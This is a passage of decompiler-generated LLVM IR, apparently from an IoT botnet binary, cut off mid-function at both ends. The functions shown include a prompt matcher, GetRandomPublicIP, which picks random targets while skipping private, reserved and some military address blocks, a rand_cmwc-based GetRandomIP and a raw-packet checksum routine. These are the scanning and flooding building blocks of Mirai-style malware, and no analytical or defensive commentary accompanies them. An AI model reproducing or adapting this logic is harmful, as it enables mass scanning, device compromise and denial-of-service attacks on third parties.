  %v5_8049959 = icmp slt i32 %v1_8049953, %arg7
  br i1 %v5_8049959, label %dec_label_pc_8049950.backedge.dec_label_pc_804995b_crit_edge, label %dec_label_pc_8049989

dec_label_pc_8049950.backedge.dec_label_pc_804995b_crit_edge: ; preds = %dec_label_pc_8049950.backedge
  %v3_804995b.pre = load i32, i32* %stack_var_-168, align 4
  br label %dec_label_pc_804995b

dec_label_pc_8049911:                             ; preds = %dec_label_pc_80498f4
  br label %dec_label_pc_8049993

dec_label_pc_804991d:                             ; preds = %dec_label_pc_80498b3
  %v3_8049926 = call i32 @strstr(i32 %v5_804987d, i8* %v2_8049926)
  %v1_804992e = icmp eq i32 %v3_8049926, 0
  %v1_8049930 = icmp eq i1 %v1_804992e, false
  br i1 %v1_8049930, label %dec_label_pc_804997d, label %dec_label_pc_8049932

dec_label_pc_8049932:                             ; preds = %dec_label_pc_804991d
  br i1 %v4_8049932, label %dec_label_pc_8049950.backedge, label %dec_label_pc_8049938

dec_label_pc_8049938:                             ; preds = %dec_label_pc_8049932
  %v3_804993b = call i32 @matchPrompt(i8* %arg6)
  %v1_8049943 = icmp eq i32 %v3_804993b, 0
  br i1 %v1_8049943, label %dec_label_pc_8049950.backedge, label %dec_label_pc_804997d

dec_label_pc_804995b:                             ; preds = %dec_label_pc_8049950.backedge.dec_label_pc_804995b_crit_edge, %dec_label_pc_804995b.lr.ph
  %v3_804995b = phi i32 [ %arg4, %dec_label_pc_804995b.lr.ph ], [ %v3_804995b.pre, %dec_label_pc_8049950.backedge.dec_label_pc_804995b_crit_edge ]
  %stack_var_-32.045 = phi i32 [ %arg8, %dec_label_pc_804995b.lr.ph ], [ %stack_var_-32.0.be, %dec_label_pc_8049950.backedge.dec_label_pc_804995b_crit_edge ]
  %tmp37 = icmp slt i32 %v3_804995b, 1
  %tmp38 = icmp eq i1 %tmp37, false
  br i1 %tmp38, label %dec_label_pc_8049821, label %dec_label_pc_8049969

dec_label_pc_8049969:                             ; preds = %dec_label_pc_804995b
  br i1 %tmp40, label %dec_label_pc_8049821, label %dec_label_pc_8049989

dec_label_pc_804997d:                             ; preds = %dec_label_pc_8049938, %dec_label_pc_804991d
  br label %dec_label_pc_8049993

dec_label_pc_8049989:                             ; preds = %dec_label_pc_8049950.backedge, %dec_label_pc_8049969, %dec_label_pc_8049821, %entry
  br label %dec_label_pc_8049993

dec_label_pc_8049993:                             ; preds = %dec_label_pc_804997d, %dec_label_pc_8049911, %dec_label_pc_80498e5, %dec_label_pc_80498a4, %dec_label_pc_8049989
  %v3_8049993 = phi i32 [ 1, %dec_label_pc_804997d ], [ 0, %dec_label_pc_8049911 ], [ 0, %dec_label_pc_80498e5 ], [ 0, %dec_label_pc_80498a4 ], [ 0, %dec_label_pc_8049989 ]
  ret i32 %v3_8049993

; uselistorder directives
  uselistorder i32 %stack_var_-32.0.be, { 1, 0 }
  uselistorder i32 %v5_80498ce, { 0, 2, 1 }
  uselistorder i32 %v5_804988d, { 0, 2, 1 }
  uselistorder i32 %v5_804987d, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 0, 2, 1 }
  uselistorder i32 %arg7, { 1, 0 }
  uselistorder i8* %arg6, { 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8049993, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8049989, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8049950.backedge, { 2, 1, 0 }
}

define i32 @GetRandomPublicIP(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80499a1 = load i32, i32* @edi, align 4
  %v0_80499a3 = load i32, i32* @ebx, align 4
  store i32 %v0_80499a3, i32* %stack_var_-16, align 4
  %v3_80499a7 = call i32 @random()
  %v2_80499b7 = ashr i32 %v3_80499a7, 31
  %v2_80499ba = zext i32 %v3_80499a7 to i64
  %v4_80499ba = zext i32 %v2_80499b7 to i64
  %v5_80499ba = mul nuw i64 %v4_80499ba, 4294967296
  %v6_80499ba = or i64 %v5_80499ba, %v2_80499ba
  %v10_80499ba = srem i64 %v6_80499ba, 223
  %v11_80499ba = trunc i64 %v10_80499ba to i32
  store i32 %v11_80499ba, i32* @eax, align 4
  %v1_80499be = trunc i64 %v10_80499ba to i8
  store i8 %v1_80499be, i8* @global_var_8059b1b.36, align 1
  %v0_80499c3 = call i32 @random()
  %v2_80499d3 = ashr i32 %v0_80499c3, 31
  %v2_80499d6 = zext i32 %v0_80499c3 to i64
  %v4_80499d6 = zext i32 %v2_80499d3 to i64
  %v5_80499d6 = mul nuw i64 %v4_80499d6, 4294967296
  %v6_80499d6 = or i64 %v5_80499d6, %v2_80499d6
  %v10_80499d6 = srem i64 %v6_80499d6, 255
  %v11_80499d6 = trunc i64 %v10_80499d6 to i32
  store i32 %v11_80499d6, i32* @eax, align 4
  %v1_80499da = trunc i64 %v10_80499d6 to i8
  store i8 %v1_80499da, i8* @global_var_8059b1c.37, align 4
  %v0_80499df = call i32 @random()
  %v2_80499ef = ashr i32 %v0_80499df, 31
  %v2_80499f2 = zext i32 %v0_80499df to i64
  %v4_80499f2 = zext i32 %v2_80499ef to i64
  %v5_80499f2 = mul nuw i64 %v4_80499f2, 4294967296
  %v6_80499f2 = or i64 %v5_80499f2, %v2_80499f2
  %v10_80499f2 = srem i64 %v6_80499f2, 255
  %v11_80499f2 = trunc i64 %v10_80499f2 to i32
  store i32 %v11_80499f2, i32* @eax, align 4
  %v1_80499f6 = trunc i64 %v10_80499f2 to i8
  store i8 %v1_80499f6, i8* @global_var_8059b1d.38, align 1
  %v0_80499fb = call i32 @random()
  %v2_8049a0b = ashr i32 %v0_80499fb, 31
  %v2_8049a0e = zext i32 %v0_80499fb to i64
  %v4_8049a0e = zext i32 %v2_8049a0b to i64
  %v5_8049a0e = mul nuw i64 %v4_8049a0e, 4294967296
  %v6_8049a0e = or i64 %v5_8049a0e, %v2_8049a0e
  br label %dec_label_pc_8049a89

dec_label_pc_8049a19:                             ; preds = %dec_label_pc_8049c12, %dec_label_pc_8049c05, %dec_label_pc_8049bf8, %dec_label_pc_8049beb, %dec_label_pc_8049bde, %dec_label_pc_8049bd1, %dec_label_pc_8049bc4, %dec_label_pc_8049bb7, %dec_label_pc_8049baa, %dec_label_pc_8049b9d, %dec_label_pc_8049b90, %dec_label_pc_8049b83, %dec_label_pc_8049b76, %dec_label_pc_8049b69, %dec_label_pc_8049b5c, %dec_label_pc_8049b3d, %dec_label_pc_8049b27, %dec_label_pc_8049b08, %dec_label_pc_8049ae9, %dec_label_pc_8049ad3, %dec_label_pc_8049ac6, %dec_label_pc_8049ab9, %dec_label_pc_8049aac, %dec_label_pc_8049a9f, %dec_label_pc_8049a92, %dec_label_pc_8049a89
  %v0_8049a19 = call i32 @random()
  %v2_8049a29 = ashr i32 %v0_8049a19, 31
  %v2_8049a2c = zext i32 %v0_8049a19 to i64
  %v4_8049a2c = zext i32 %v2_8049a29 to i64
  %v5_8049a2c = mul nuw i64 %v4_8049a2c, 4294967296
  %v6_8049a2c = or i64 %v5_8049a2c, %v2_8049a2c
  %v10_8049a2c = srem i64 %v6_8049a2c, 223
  %v11_8049a2c = trunc i64 %v10_8049a2c to i32
  store i32 %v11_8049a2c, i32* @eax, align 4
  %v1_8049a30 = trunc i64 %v10_8049a2c to i8
  store i8 %v1_8049a30, i8* @global_var_8059b1b.36, align 1
  %v0_8049a35 = call i32 @random()
  %v2_8049a45 = ashr i32 %v0_8049a35, 31
  %v2_8049a48 = zext i32 %v0_8049a35 to i64
  %v4_8049a48 = zext i32 %v2_8049a45 to i64
  %v5_8049a48 = mul nuw i64 %v4_8049a48, 4294967296
  %v6_8049a48 = or i64 %v5_8049a48, %v2_8049a48
  %v10_8049a48 = srem i64 %v6_8049a48, 255
  %v11_8049a48 = trunc i64 %v10_8049a48 to i32
  store i32 %v11_8049a48, i32* @eax, align 4
  %v1_8049a4c = trunc i64 %v10_8049a48 to i8
  store i8 %v1_8049a4c, i8* @global_var_8059b1c.37, align 4
  %v0_8049a51 = call i32 @random()
  %v2_8049a61 = ashr i32 %v0_8049a51, 31
  %v2_8049a64 = zext i32 %v0_8049a51 to i64
  %v4_8049a64 = zext i32 %v2_8049a61 to i64
  %v5_8049a64 = mul nuw i64 %v4_8049a64, 4294967296
  %v6_8049a64 = or i64 %v5_8049a64, %v2_8049a64
  %v10_8049a64 = srem i64 %v6_8049a64, 255
  %v11_8049a64 = trunc i64 %v10_8049a64 to i32
  store i32 %v11_8049a64, i32* @eax, align 4
  %v1_8049a68 = trunc i64 %v10_8049a64 to i8
  store i8 %v1_8049a68, i8* @global_var_8059b1d.38, align 1
  %v0_8049a6d = call i32 @random()
  %v2_8049a7d = ashr i32 %v0_8049a6d, 31
  %v2_8049a80 = zext i32 %v0_8049a6d to i64
  %v4_8049a80 = zext i32 %v2_8049a7d to i64
  %v5_8049a80 = mul nuw i64 %v4_8049a80, 4294967296
  %v6_8049a80 = or i64 %v5_8049a80, %v2_8049a80
  br label %dec_label_pc_8049a89

dec_label_pc_8049a89:                             ; preds = %entry, %dec_label_pc_8049a19
  %v6_8049a0e.sink = phi i64 [ %v6_8049a0e, %entry ], [ %v6_8049a80, %dec_label_pc_8049a19 ]
  %v10_8049a0e = srem i64 %v6_8049a0e.sink, 255
  %extract.t = trunc i64 %v10_8049a0e to i8
  %extract.t8 = trunc i64 %v10_8049a0e to i32
  store i8 %extract.t, i8* @global_var_8059b1e.39, align 2
  %v0_8049a89 = load i8, i8* @global_var_8059b1b.36, align 1
  %v1_8049a89 = zext i8 %v0_8049a89 to i32
  %v3_8049a89 = and i32 %extract.t8, -256
  %v4_8049a89 = or i32 %v1_8049a89, %v3_8049a89
  store i32 %v4_8049a89, i32* @eax, align 4
  %v10_8049a8e = icmp eq i8 %v0_8049a89, 127
  br i1 %v10_8049a8e, label %dec_label_pc_8049a19, label %dec_label_pc_8049a92

dec_label_pc_8049a92:                             ; preds = %dec_label_pc_8049a89
  store i32 %v4_8049a89, i32* @eax, align 4
  %v4_8049a97 = icmp eq i8 %v0_8049a89, 0
  br i1 %v4_8049a97, label %dec_label_pc_8049a19, label %dec_label_pc_8049a9f

dec_label_pc_8049a9f:                             ; preds = %dec_label_pc_8049a92
  store i32 %v4_8049a89, i32* @eax, align 4
  %v10_8049aa4 = icmp eq i8 %v0_8049a89, 3
  br i1 %v10_8049aa4, label %dec_label_pc_8049a19, label %dec_label_pc_8049aac

dec_label_pc_8049aac:                             ; preds = %dec_label_pc_8049a9f
  store i32 %v4_8049a89, i32* @eax, align 4
  %v10_8049ab1 = icmp eq i8 %v0_8049a89, 15
  br i1 %v10_8049ab1, label %dec_label_pc_8049a19, label %dec_label_pc_8049ab9

dec_label_pc_8049ab9:                             ; preds = %dec_label_pc_8049aac
  store i32 %v4_8049a89, i32* @eax, align 4
  %v7_8049abe = icmp eq i8 %v0_8049a89, 16
  br i1 %v7_8049abe, label %dec_label_pc_8049a19, label %dec_label_pc_8049ac6

dec_label_pc_8049ac6:                             ; preds = %dec_label_pc_8049ab9
  store i32 %v4_8049a89, i32* @eax, align 4
  %v10_8049acb = icmp eq i8 %v0_8049a89, 56
  br i1 %v10_8049acb, label %dec_label_pc_8049a19, label %dec_label_pc_8049ad3

dec_label_pc_8049ad3:                             ; preds = %dec_label_pc_8049ac6
  store i32 %v4_8049a89, i32* @eax, align 4
  %v10_8049ad8 = icmp eq i8 %v0_8049a89, 10
  br i1 %v10_8049ad8, label %dec_label_pc_8049a19, label %dec_label_pc_8049ae0

dec_label_pc_8049ae0:                             ; preds = %dec_label_pc_8049ad3
  %v8_8049ae5 = icmp eq i8 %v0_8049a89, -64
  %v1_8049ae7 = icmp eq i1 %v8_8049ae5, false
  br i1 %v1_8049ae7, label %dec_label_pc_8049af6, label %dec_label_pc_8049ae9

dec_label_pc_8049ae9:                             ; preds = %dec_label_pc_8049ae0
  %v0_8049ae9 = load i8, i8* @global_var_8059b1c.37, align 4
  %v1_8049ae9 = zext i8 %v0_8049ae9 to i32
  %v4_8049ae9 = or i32 %v1_8049ae9, %v3_8049a89
  store i32 %v4_8049ae9, i32* @eax, align 4
  %v11_8049aee = icmp eq i8 %v0_8049ae9, -88
  br i1 %v11_8049aee, label %dec_label_pc_8049a19, label %dec_label_pc_8049af6

dec_label_pc_8049af6:                             ; preds = %dec_label_pc_8049ae9, %dec_label_pc_8049ae0
  %v2_8049af6 = phi i32 [ %v4_8049ae9, %dec_label_pc_8049ae9 ], [ %v4_8049a89, %dec_label_pc_8049ae0 ]
  %v3_8049af6 = and i32 %v2_8049af6, -256
  %v4_8049af6 = or i32 %v3_8049af6, %v1_8049a89
  %v11_8049afb = icmp eq i8 %v0_8049a89, -84
  %v1_8049afd = icmp eq i1 %v11_8049afb, false
  br i1 %v1_8049afd, label %dec_label_pc_8049b15, label %dec_label_pc_8049aff

dec_label_pc_8049aff:                             ; preds = %dec_label_pc_8049af6
  %v0_8049aff = load i8, i8* @global_var_8059b1c.37, align 4
  %v1_8049aff = zext i8 %v0_8049aff to i32
  %v4_8049aff = or i32 %v1_8049aff, %v3_8049af6
  %tmp32 = icmp ult i8 %v0_8049aff, 16
  br i1 %tmp32, label %dec_label_pc_8049b15, label %dec_label_pc_8049b08

dec_label_pc_8049b08:                             ; preds = %dec_label_pc_8049aff
  store i32 %v4_8049aff, i32* @eax, align 4
  %tmp33 = icmp ult i8 %v0_8049aff, 32
  br i1 %tmp33, label %dec_label_pc_8049a19, label %dec_label_pc_8049b15

dec_label_pc_8049b15:                             ; preds = %dec_label_pc_8049b08, %dec_label_pc_8049aff, %dec_label_pc_8049af6
  %v2_8049b15 = phi i32 [ %v4_8049aff, %dec_label_pc_8049b08 ], [ %v4_8049aff, %dec_label_pc_8049aff ], [ %v4_8049af6, %dec_label_pc_8049af6 ]
  %v3_8049b15 = and i32 %v2_8049b15, -256
  %v4_8049b15 = or i32 %v3_8049b15, %v1_8049a89
  %v10_8049b1a = icmp eq i8 %v0_8049a89, 100
  %v1_8049b1c = icmp eq i1 %v10_8049b1a, false
  br i1 %v1_8049b1c, label %dec_label_pc_8049b34, label %dec_label_pc_8049b1e

dec_label_pc_8049b1e:                             ; preds = %dec_label_pc_8049b15
  %v0_8049b1e = load i8, i8* @global_var_8059b1c.37, align 4
  %v1_8049b1e = zext i8 %v0_8049b1e to i32
  %v4_8049b1e = or i32 %v1_8049b1e, %v3_8049b15
  %tmp34 = icmp ult i8 %v0_8049b1e, 64
  br i1 %tmp34, label %dec_label_pc_8049b34, label %dec_label_pc_8049b27

dec_label_pc_8049b27:                             ; preds = %dec_label_pc_8049b1e
  store i32 %v4_8049b1e, i32* @eax, align 4
  %tmp35 = icmp ult i8 %v0_8049b1e, 127
  br i1 %tmp35, label %dec_label_pc_8049a19, label %dec_label_pc_8049b34

dec_label_pc_8049b34:                             ; preds = %dec_label_pc_8049b27, %dec_label_pc_8049b1e, %dec_label_pc_8049b15
  %v2_8049b34 = phi i32 [ %v4_8049b1e, %dec_label_pc_8049b27 ], [ %v4_8049b1e, %dec_label_pc_8049b1e ], [ %v4_8049b15, %dec_label_pc_8049b15 ]
  %v3_8049b34 = and i32 %v2_8049b34, -256
  %v4_8049b34 = or i32 %v3_8049b34, %v1_8049a89
  %v11_8049b39 = icmp eq i8 %v0_8049a89, -87
  %v1_8049b3b = icmp eq i1 %v11_8049b39, false
  br i1 %v1_8049b3b, label %dec_label_pc_8049b4a, label %dec_label_pc_8049b3d

dec_label_pc_8049b3d:                             ; preds = %dec_label_pc_8049b34
  %v0_8049b3d = load i8, i8* @global_var_8059b1c.37, align 4
  %v1_8049b3d = zext i8 %v0_8049b3d to i32
  %v4_8049b3d = or i32 %v1_8049b3d, %v3_8049b34
  store i32 %v4_8049b3d, i32* @eax, align 4
  %v11_8049b42 = icmp eq i8 %v0_8049b3d, -1
  br i1 %v11_8049b42, label %dec_label_pc_8049a19, label %dec_label_pc_8049b4a

dec_label_pc_8049b4a:                             ; preds = %dec_label_pc_8049b3d, %dec_label_pc_8049b34
  %v2_8049b4a = phi i32 [ %v4_8049b3d, %dec_label_pc_8049b3d ], [ %v4_8049b34, %dec_label_pc_8049b34 ]
  %v3_8049b4a = and i32 %v2_8049b4a, -256
  %v4_8049b4a = or i32 %v3_8049b4a, %v1_8049a89
  %v11_8049b4f = icmp eq i8 %v0_8049a89, -58
  %v1_8049b51 = icmp eq i1 %v11_8049b4f, false
  br i1 %v1_8049b51, label %dec_label_pc_8049b69, label %dec_label_pc_8049b53

dec_label_pc_8049b53:                             ; preds = %dec_label_pc_8049b4a
  %v0_8049b53 = load i8, i8* @global_var_8059b1c.37, align 4
  %v1_8049b53 = zext i8 %v0_8049b53 to i32
  %v4_8049b53 = or i32 %v1_8049b53, %v3_8049b4a
  %tmp36 = icmp ult i8 %v0_8049b53, 18
  br i1 %tmp36, label %dec_label_pc_8049b69, label %dec_label_pc_8049b5c

dec_label_pc_8049b5c:                             ; preds = %dec_label_pc_8049b53
  store i32 %v4_8049b53, i32* @eax, align 4
  %tmp37 = or i8 %v0_8049b53, 1
  %tmp38 = icmp eq i8 %tmp37, 19
  br i1 %tmp38, label %dec_label_pc_8049a19, label %dec_label_pc_8049b69

dec_label_pc_8049b69:                             ; preds = %dec_label_pc_8049b5c, %dec_label_pc_8049b53, %dec_label_pc_8049b4a
  %v2_8049b69 = phi i32 [ %v4_8049b53, %dec_label_pc_8049b5c ], [ %v4_8049b53, %dec_label_pc_8049b53 ], [ %v4_8049b4a, %dec_label_pc_8049b4a ]
  %v3_8049b69 = and i32 %v2_8049b69, -256
  %v4_8049b69 = or i32 %v3_8049b69, %v1_8049a89
  store i32 %v4_8049b69, i32* @eax, align 4
  %v8_8049b6e = icmp eq i8 %v0_8049a89, -32
  br i1 %v8_8049b6e, label %dec_label_pc_8049a19, label %dec_label_pc_8049b76

dec_label_pc_8049b76:                             ; preds = %dec_label_pc_8049b69
  store i32 %v4_8049b69, i32* @eax, align 4
  %v10_8049b7b = icmp eq i8 %v0_8049a89, 6
  br i1 %v10_8049b7b, label %dec_label_pc_8049a19, label %dec_label_pc_8049b83

dec_label_pc_8049b83:                             ; preds = %dec_label_pc_8049b76
  store i32 %v4_8049b69, i32* @eax, align 4
  %v10_8049b88 = icmp eq i8 %v0_8049a89, 7
  br i1 %v10_8049b88, label %dec_label_pc_8049a19, label %dec_label_pc_8049b90

dec_label_pc_8049b90:                             ; preds = %dec_label_pc_8049b83
  store i32 %v4_8049b69, i32* @eax, align 4
  %v10_8049b95 = icmp eq i8 %v0_8049a89, 11
  br i1 %v10_8049b95, label %dec_label_pc_8049a19, label %dec_label_pc_8049b9d

dec_label_pc_8049b9d:                             ; preds = %dec_label_pc_8049b90
  store i32 %v4_8049b69, i32* @eax, align 4
  %v10_8049ba2 = icmp eq i8 %v0_8049a89, 21
  br i1 %v10_8049ba2, label %dec_label_pc_8049a19, label %dec_label_pc_8049baa

dec_label_pc_8049baa:                             ; preds = %dec_label_pc_8049b9d
  store i32 %v4_8049b69, i32* @eax, align 4
  %v10_8049baf = icmp eq i8 %v0_8049a89, 22
  br i1 %v10_8049baf, label %dec_label_pc_8049a19, label %dec_label_pc_8049bb7

dec_label_pc_8049bb7:                             ; preds = %dec_label_pc_8049baa
  store i32 %v4_8049b69, i32* @eax, align 4
  %v10_8049bbc = icmp eq i8 %v0_8049a89, 26
  br i1 %v10_8049bbc, label %dec_label_pc_8049a19, label %dec_label_pc_8049bc4

dec_label_pc_8049bc4:                             ; preds = %dec_label_pc_8049bb7
  store i32 %v4_8049b69, i32* @eax, align 4
  %v10_8049bc9 = icmp eq i8 %v0_8049a89, 28
  br i1 %v10_8049bc9, label %dec_label_pc_8049a19, label %dec_label_pc_8049bd1

dec_label_pc_8049bd1:                             ; preds = %dec_label_pc_8049bc4
  store i32 %v4_8049b69, i32* @eax, align 4
  %v10_8049bd6 = icmp eq i8 %v0_8049a89, 29
  br i1 %v10_8049bd6, label %dec_label_pc_8049a19, label %dec_label_pc_8049bde

dec_label_pc_8049bde:                             ; preds = %dec_label_pc_8049bd1
  store i32 %v4_8049b69, i32* @eax, align 4
  %v10_8049be3 = icmp eq i8 %v0_8049a89, 30
  br i1 %v10_8049be3, label %dec_label_pc_8049a19, label %dec_label_pc_8049beb

dec_label_pc_8049beb:                             ; preds = %dec_label_pc_8049bde
  store i32 %v4_8049b69, i32* @eax, align 4
  %v10_8049bf0 = icmp eq i8 %v0_8049a89, 33
  br i1 %v10_8049bf0, label %dec_label_pc_8049a19, label %dec_label_pc_8049bf8

dec_label_pc_8049bf8:                             ; preds = %dec_label_pc_8049beb
  store i32 %v4_8049b69, i32* @eax, align 4
  %v10_8049bfd = icmp eq i8 %v0_8049a89, 55
  br i1 %v10_8049bfd, label %dec_label_pc_8049a19, label %dec_label_pc_8049c05

dec_label_pc_8049c05:                             ; preds = %dec_label_pc_8049bf8
  store i32 %v4_8049b69, i32* @eax, align 4
  %v11_8049c0a = icmp eq i8 %v0_8049a89, -42
  br i1 %v11_8049c0a, label %dec_label_pc_8049a19, label %dec_label_pc_8049c12

dec_label_pc_8049c12:                             ; preds = %dec_label_pc_8049c05
  store i32 %v4_8049b69, i32* @eax, align 4
  %v11_8049c17 = icmp eq i8 %v0_8049a89, -41
  br i1 %v11_8049c17, label %dec_label_pc_8049a19, label %dec_label_pc_8049c1f

dec_label_pc_8049c1f:                             ; preds = %dec_label_pc_8049c12
  store i32 0, i32* %stack_var_-32, align 4
  %v1_8049c3b = urem i32 %extract.t8, 256
  store i32 %v1_8049c3b, i32* @edx, align 4
  %v0_8049c47 = load i8, i8* @global_var_8059b1d.38, align 1
  %v1_8049c47 = zext i8 %v0_8049c47 to i32
  %v0_8049c53 = load i8, i8* @global_var_8059b1c.37, align 4
  %v1_8049c53 = zext i8 %v0_8049c53 to i32
  store i32 %v1_8049c53, i32* @ebx, align 4
  %v2_8049c6e = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8049c6e, i32* @edi, align 4
  %v7_8049c7a = call i32 @szprintf(i32 %v2_8049c6e, i32 ptrtoint ([12 x i8]* @global_var_80561ac.40 to i32), i32 %v1_8049a89, i32 %v1_8049c53, i32 %v1_8049c47, i32 %v1_8049c3b)
  %v1_8049c89 = call i32 @inet_addr(i32 %v2_8049c6e)
  %v2_8049c94 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8049c94, i32* @ebx, align 4
  store i32 %v0_80499a1, i32* @edi, align 4
  ret i32 %v1_8049c89

; uselistorder directives
  uselistorder i32 %v4_8049b53, { 2, 1, 0 }
  uselistorder i32 %v4_8049b1e, { 2, 1, 0 }
  uselistorder i32 %v4_8049aff, { 2, 1, 0 }
  uselistorder i8 %v0_8049a89, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 26 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i8* @global_var_8059b1d.38, { 2, 1, 0 }
  uselistorder i8* @global_var_8059b1c.37, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i64 255, { 2, 0, 1, 3, 4 }
  uselistorder i8* @global_var_8059b1b.36, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8049a89, { 1, 0 }
}

define i32 @GetRandomIP(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8049c9f = load i32, i32* @global_var_805fd88.41, align 8
  %v1_8049ca8 = call i32 @ntohl(i32 %v0_8049c9f)
  %v5_8049cb0 = and i32 %v1_8049ca8, %arg1
  %v1_8049cb6 = call i32 @rand_cmwc(i32 %v5_8049cb0)
  %v1_8049cc0 = sub i32 -1, %arg1
  %v2_8049cc2 = and i32 %v1_8049cb6, %v1_8049cc0
  %v5_8049cc4 = xor i32 %v2_8049cc2, %v5_8049cb0
  ret i32 %v5_8049cc4
}

define i32 @csum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8049cce = load i32, i32* @ebx, align 4
  %v4_8049d0233 = add i32 %arg2, -1
  %v9_8049d0234 = sub i32 0, %arg2
  %v10_8049d0235 = and i32 %arg2, %v9_8049d0234
  %v11_8049d0236 = icmp slt i32 %v10_8049d0235, 0
  %v12_8049d0237 = icmp eq i32 %v4_8049d0233, 0
  %v13_8049d0238 = icmp slt i32 %v4_8049d0233, 0
  %v3_8049d0639 = icmp eq i1 %v13_8049d0238, %v11_8049d0236
  %v4_8049d0640 = icmp eq i1 %v12_8049d0237, false
  %v5_8049d0641 = and i1 %v4_8049d0640, %v3_8049d0639
  br i1 %v5_8049d0641, label %dec_label_pc_8049ce2.lr.ph, label %dec_label_pc_8049d08

dec_label_pc_8049ce2.lr.ph:                       ; preds = %entry
  %v4_8049ce5.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8049ce2

dec_label_pc_8049ce2:                             ; preds = %dec_label_pc_8049ce2.lr.ph, %dec_label_pc_8049ce2
  %v4_8049ce5 = phi i32 [ %v4_8049ce5.pre, %dec_label_pc_8049ce2.lr.ph ], [ %v6_8049ce5, %dec_label_pc_8049ce2 ]
  %stack_var_-24.045 = phi i16 [ 0, %dec_label_pc_8049ce2.lr.ph ], [ %v9_8049cf7, %dec_label_pc_8049ce2 ]
  %stack_var_8.044 = phi i32 [ %arg2, %dec_label_pc_8049ce2.lr.ph ], [ %v4_8049cfe, %dec_label_pc_8049ce2 ]
  %stack_var_4.043 = phi i16* [ %arg1, %dec_label_pc_8049ce2.lr.ph ], [ %v23_8049cfa, %dec_label_pc_8049ce2 ]
  %v3_8049cf442 = phi i32 [ 0, %dec_label_pc_8049ce2.lr.ph ], [ %v6_8049cf4, %dec_label_pc_8049ce2 ]
  %v4_8049ce2 = ptrtoint i16* %stack_var_4.043 to i32
  %v2_8049ce5 = load i16, i16* %stack_var_4.043, align 2
  %v3_8049ce5 = zext i16 %v2_8049ce5 to i32
  %v5_8049ce5 = and i32 %v4_8049ce5, -65536
  %v6_8049ce5 = or i32 %v5_8049ce5, %v3_8049ce5
  store i32 %v6_8049ce5, i32* @ecx, align 4
  %sext51 = mul i32 %v3_8049cf442, 65536
  %v4_8049cf4 = sdiv i32 %sext51, 65536
  %v6_8049cf4 = add nsw i32 %v3_8049ce5, %v4_8049cf4
  %v11_8049cf4 = icmp ult i32 %v6_8049cf4, %v4_8049cf4
  %v26_8049cf4 = trunc i32 %v6_8049cf4 to i16
  %v7_8049cf7 = zext i1 %v11_8049cf4 to i16
  %v9_8049cf7 = add i16 %v7_8049cf7, %stack_var_-24.045
  %v5_8049cfa = add i32 %v4_8049ce2, 2
  %v23_8049cfa = inttoptr i32 %v5_8049cfa to i16*
  %v4_8049cfe = add i32 %stack_var_8.044, -2
  %v4_8049d02 = add i32 %stack_var_8.044, -3
  %v9_8049d02 = sub i32 2, %stack_var_8.044
  %v10_8049d02 = and i32 %v4_8049cfe, %v9_8049d02
  %v11_8049d02 = icmp slt i32 %v10_8049d02, 0
  %v12_8049d02 = icmp eq i32 %v4_8049d02, 0
  %v13_8049d02 = icmp slt i32 %v4_8049d02, 0
  %v3_8049d06 = icmp eq i1 %v13_8049d02, %v11_8049d02
  %v4_8049d06 = icmp eq i1 %v12_8049d02, false
  %v5_8049d06 = and i1 %v4_8049d06, %v3_8049d06
  br i1 %v5_8049d06, label %dec_label_pc_8049ce2, label %dec_label_pc_8049d08

dec_label_pc_8049d08:                             ; preds = %dec_label_pc_8049ce2, %entry
  %v3_8049cf4.lcssa = phi i16 [ 0, %entry ], [ %v26_8049cf4, %dec_label_pc_8049ce2 ]
  %stack_var_4.0.lcssa = phi i16* [ %arg1, %entry ], [ %v23_8049cfa, %dec_label_pc_8049ce2 ]
  %stack_var_8.0.lcssa = phi i32 [ %arg2, %entry ], [ %v4_8049cfe, %dec_label_pc_8049ce2 ]
  %stack_var_-24.0.lcssa = phi i16 [ 0, %entry ], [ %v9_8049cf7, %dec_label_pc_8049ce2 ]
  %tmp18 = icmp slt i32 %stack_var_8.0.lcssa, 1
  br i1 %tmp18, label %dec_label_pc_8049d4c.preheader, label %dec_label_pc_8049d0e

dec_label_pc_8049d0e:                             ; preds = %dec_label_pc_8049d08
  %v1_8049d11 = bitcast i16* %stack_var_4.0.lcssa to i8*
  %v2_8049d11 = load i8, i8* %v1_8049d11, align 1
  %v3_8049d11 = zext i8 %v2_8049d11 to i32
  %v4_8049d11 = load i32, i32* @ecx, align 4
  %v5_8049d11 = and i32 %v4_8049d11, -256
  %v6_8049d11 = or i32 %v5_8049d11, %v3_8049d11
  store i32 %v6_8049d11, i32* @ecx, align 4
  %v4_8049d1f = sext i16 %v3_8049cf4.lcssa to i32
  %v6_8049d1f = add nsw i32 %v3_8049d11, %v4_8049d1f
  %v11_8049d1f = icmp ult i32 %v6_8049d1f, %v4_8049d1f
  %v26_8049d1f = trunc i32 %v6_8049d1f to i16
  %v7_8049d22 = zext i1 %v11_8049d1f to i16
  %v9_8049d22 = add i16 %v7_8049d22, %stack_var_-24.0.lcssa
  br label %dec_label_pc_8049d4c.preheader

dec_label_pc_8049d4c.preheader:                   ; preds = %dec_label_pc_8049d0e, %dec_label_pc_8049d08
  %v3_8049d31.ph = phi i16 [ %v3_8049cf4.lcssa, %dec_label_pc_8049d08 ], [ %v26_8049d1f, %dec_label_pc_8049d0e ]
  %stack_var_-24.1.ph = phi i16 [ %stack_var_-24.0.lcssa, %dec_label_pc_8049d08 ], [ %v9_8049d22, %dec_label_pc_8049d0e ]
  %v4_8049d4c20 = sext i16 %v3_8049d31.ph to i32
